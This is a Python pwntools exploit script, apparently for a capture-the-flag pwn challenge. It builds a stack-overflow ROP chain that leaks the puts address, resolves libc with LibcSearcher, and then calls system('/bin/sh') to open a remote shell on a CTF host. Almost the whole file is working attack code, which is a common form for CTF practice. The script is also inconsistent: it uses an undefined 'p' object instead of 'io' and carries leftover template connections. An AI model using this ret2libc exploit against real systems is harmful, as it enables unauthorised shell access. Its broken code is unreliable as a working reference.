import time
from pwn import *
from LibcSearcher import *
from ctypes import *

# io = remote("192.168.170.128", 9997)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 29323)
io = remote("node5.anna.nssctf.cn", 28357)
# io = process('./q2')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('./service')
# libc = ELF('./libc-2.23.so')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r():
    return (io.recv())
def ru(a):
    return io.recvuntil(a)
def rl():
    io.recvline()
def sla(a, b):
    io.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()
def print_addr(name, addr):
    print(f"{name} =", addr)


# context(os='linux', arch='amd64')
context(os='linux', arch='amd64', log_level="debug")

io = remote("node4.anna.nssctf.cn", 28583)
elf = ELF('./dasctf_sixbytes')

ret_addr = 0x04004c9
rdi_addr = 0x0400733
got_addr = elf.got['puts']
plt_addr = elf.plt['puts']
main_addr = elf.sym['main']

payload = b'a' * (0x20 + 0x8) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)
p.recvuntil("Pull up your sword and tell me u story!\n")
p.sendline(payload)
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
print(hex(puts_addr))

lib = LibcSearcher('puts', puts_addr)
lib_puts_addr = lib.dump('puts')
lib_system_addr = lib.dump('system')
lib_binsh_addr = lib.dump("str_bin_sh")

base_addr = puts_addr - lib_puts_addr
system_addr = base_addr + lib_system_addr
binsh_addr = base_addr + lib_binsh_addr

payload = b'a' * (0x20 + 0x8) + p64(ret_addr) + p64(rdi_addr) + p64(binsh_addr) + p64(system_addr)
p.sendline(payload)

inter()